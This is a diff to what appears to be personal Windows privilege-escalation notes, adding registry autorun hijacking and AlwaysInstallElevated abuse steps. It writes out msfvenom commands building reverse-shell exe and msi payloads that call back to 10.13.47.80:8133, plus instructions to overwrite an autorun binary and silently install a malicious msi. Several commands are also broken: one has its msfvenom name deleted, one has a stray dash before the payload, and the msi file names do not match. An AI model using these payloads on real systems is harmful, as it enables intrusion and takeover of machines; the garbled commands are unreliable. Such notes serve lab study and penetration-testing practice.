@@ -4,7 +4,8 @@
 
 ### Creating a Reverse Shell Executable (.exe)
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.47.80 LPORT=8133 -f exe -o reverse.exe
+
+-p windows/x64/shell_reverse_tcp LHOST=10.13.47.80 LPORT=8133 -f exe -o reverse.exe
 ```
 ### Transfering Shell
 - Through SMB
@@ -192,6 +193,43 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.47.80 LPORT=8133 -f dll -o
 ```
 9. put dll in writeable folder
 10. start netcat and start svc
+
+## Registry Exploit
+
+### For exe
+1. Check winpeas under ```Autorun Application``` section
+2. Look for a autorun application that anyone can write to.
+3. To do it manually for step 1 and 2
+```
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+# Run this for each output
+.\accesschk.exe /accepteula -wvu <filename.exe>
+```
+4. Backup original .exe
+5. Overwrite original .exe with our reverse.exe
+6. setup up netcat and restart windows
+- Note windows 10 will run application based on last logged out user.
+
+### For msi
+1. Check winpeas under ```Checking AlwaysInstalledElevated``` 
+2. Make sure both local Machine (HKLM) and user (HKCU) has ```AlwaysInstalledElevated``` on the Installer path set to 1.
+3. Manual query these 2 line:
+```
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstalledElevated
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstalledElevated
+```
+4 Generate reverse shell with msfvenom
+```
+msfvenom -p -windows/x64/shell_reverse_tcp LHOST=10.13.47.80 LPORT=8133 -f msi -o game.msi
+```
+5. Copy the msi applications to target server
+6. setup netcat and Run the msi
+```
+msiexec /quiet /qn /i reverse.msi
+
+```
 
 ## Kernel Exploit (Last resort)
 ### Tools
